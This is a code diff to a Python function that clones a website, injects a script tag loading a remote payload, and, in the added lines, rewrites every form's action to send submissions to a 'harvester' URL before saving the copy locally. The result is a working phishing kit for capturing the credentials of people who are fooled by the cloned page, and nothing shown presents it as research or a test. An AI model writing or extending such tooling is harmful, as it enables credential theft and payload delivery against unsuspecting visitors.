@@ -4,9 +4,9 @@ import logging
 import os
 from docx import Document
 
-def clone_website(url, payload_url):
+def clone_website(url, harvester_url, payload_url=None):
     """
-    Clones a website and injects a script tag to serve a payload.
+    Clones a website, injects a script tag, and redirects forms to a harvester.
     """
     logging.info(f"Cloning website: {url}")
     try:
@@ -17,13 +17,24 @@ def clone_website(url, payload_url):
 
         soup = BeautifulSoup(response.text, 'html.parser')
 
-        script_tag = soup.new_tag("script", src=payload_url)
-        if soup.head:
-            soup.head.insert(0, script_tag)
+        # Inject payload script if provided
+        if payload_url:
+            script_tag = soup.new_tag("script", src=payload_url)
+            if soup.head:
+                soup.head.insert(0, script_tag)
+            else:
+                head = soup.new_tag("head")
+                soup.html.insert(0, head)
+                soup.head.append(script_tag)
+
+        # Find and modify all forms to point to the harvester
+        forms = soup.find_all("form")
+        if forms:
+            for form in forms:
+                form['action'] = harvester_url
+            logging.info(f"Redirected {len(forms)} form(s) to the harvester.")
         else:
-            head = soup.new_tag("head")
-            soup.html.insert(0, head)
-            soup.head.append(script_tag)
+            logging.warning("No forms found on the page to redirect.")
 
         output_dir = "cloned_site"
         if not os.path.exists(output_dir):
